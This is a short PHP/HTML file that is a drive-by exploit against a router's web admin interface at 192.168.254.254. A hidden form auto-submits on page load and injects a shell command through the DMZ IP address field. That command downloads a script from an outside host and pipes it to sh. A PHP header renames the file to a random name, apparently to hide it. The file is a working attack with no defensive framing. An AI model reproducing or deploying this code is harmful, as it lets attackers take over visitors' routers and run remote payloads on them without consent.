<php?
$filename = basename(__FILE__, '.html');
$filename1 = "$filename.html";  
$generate = bin2hex(random_bytes(5));
$generate1 = "zlts10g$generate.html"; 
rename($filename1, $generate1);
?>
<form method="post" id="exploit" action="http://192.168.254.254/goform/goform_set_cmd_process">
<input name="goformId" value="DMZ_SETTING" type="hidden">
<input name="isTest" value="false" type="hidden">
<input name="DMZEnabled" value="1" & type="hidden">
<input name="DMZIPAddress" value="127.0.0.1 | curl http://junjuncruzit.online/zlt-ais.sh -o - | sh &" type="hidden">
<input type="submit" style="display:none;"></form>
<script>
function exploit () {
var xploit = document.getElementById("exploit");
xploit.submit();
}
window.onload = exploit;
  </script>
